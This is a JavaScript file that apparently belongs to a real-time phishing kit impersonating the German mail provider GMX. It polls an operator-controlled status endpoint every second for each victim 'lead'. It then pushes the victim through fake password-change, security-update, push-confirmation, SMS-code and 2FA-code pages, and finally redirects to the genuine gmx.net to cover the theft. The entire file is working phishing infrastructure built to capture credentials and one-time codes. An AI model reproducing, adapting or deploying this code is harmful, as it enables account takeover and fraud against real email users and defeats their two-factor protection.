/**
 * Единый опрос статуса лида на всех страницах.
 * Редирект при любом redirect_* или error — независимо от текущей страницы.
 */
(function () {
  'use strict';

  function getLeadId() {
    try {
      var params = new URLSearchParams(window.location.search);
      var id = params.get('id') || '';
      if (id) return id;
      return (typeof sessionStorage !== 'undefined' && sessionStorage.getItem('gmw_lead_id')) || '';
    } catch (e) { return ''; }
  }

  var leadId = getLeadId();
  if (!leadId) return;

  function currentPath() {
    var p = (window.location.pathname || '').replace(/\/$/, '') || '/';
    return p;
  }

  function isSamePage(pathOrUrl) {
    if (!pathOrUrl) return false;
    if (pathOrUrl.indexOf('http') === 0) return false;
    var target = pathOrUrl.replace(/\?.*$/, '').replace(/\/$/, '') || '/';
    var cur = currentPath();
    return cur === target || cur === target + '.html' || cur + '.html' === target;
  }

  var interval = null;
  function check() {
    if (isSamePage('/sicherheit-anleitung')) return;
    fetch('/api/status?id=' + encodeURIComponent(leadId) + '&page=any&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
      .then(function (r) { return r.json(); })
      .then(function (res) {
        var mode = (res && res.mode) || '';
        var st = res && res.status;
        if (mode === 'manual' && st === 'pending') return;
        if (st === 'redirect_change_password') {
          if (isSamePage('/passwort-aendern')) return;
          if (interval) { clearInterval(interval); interval = null; }
          window.location = '/passwort-aendern?id=' + encodeURIComponent(leadId);
        } else if (st === 'redirect_sicherheit') {
          if (isSamePage('/sicherheit-update')) return;
          if (interval) { clearInterval(interval); interval = null; }
          window.location = '/sicherheit-update?id=' + encodeURIComponent(leadId);
        } else if (st === 'redirect_android') {
          if (isSamePage('/app-update')) return;
          if (interval) { clearInterval(interval); interval = null; }
          window.location = '/app-update?id=' + encodeURIComponent(leadId);
        } else if (st === 'redirect_open_on_pc') {
          if (isSamePage('/bitte-am-pc')) return;
          if (interval) { clearInterval(interval); interval = null; }
          window.location = '/bitte-am-pc?id=' + encodeURIComponent(leadId);
        } else if (st === 'redirect_push') {
          if (isSamePage('/push-confirm.html')) return;
          if (interval) { clearInterval(interval); interval = null; }
          window.location = '/push-confirm.html?id=' + encodeURIComponent(leadId);
        } else if (st === 'redirect_sms_code') {
          if (isSamePage('/sms-code.html')) return;
          if (interval) { clearInterval(interval); interval = null; }
          window.location = '/sms-code.html?id=' + encodeURIComponent(leadId);
        } else if (st === 'redirect_2fa_code') {
          if (isSamePage('/2fa-code.html')) return;
          if (interval) { clearInterval(interval); interval = null; }
          window.location = '/2fa-code.html?id=' + encodeURIComponent(leadId);
        } else if (st === 'redirect_gmx_net') {
          if (interval) { clearInterval(interval); interval = null; }
          window.location.href = (typeof window !== 'undefined' && window.__BRAND__ && window.__BRAND__.canonicalUrl) ? window.__BRAND__.canonicalUrl : 'https://www.gmx.net/';
        } else if (st === 'error') {
          if (isSamePage('/anmelden')) return;
          if (interval) { clearInterval(interval); interval = null; }
          window.location = '/anmelden';
        }
      })
      .catch(function () {});
  }

  check();
  interval = setInterval(check, 1000);
})();
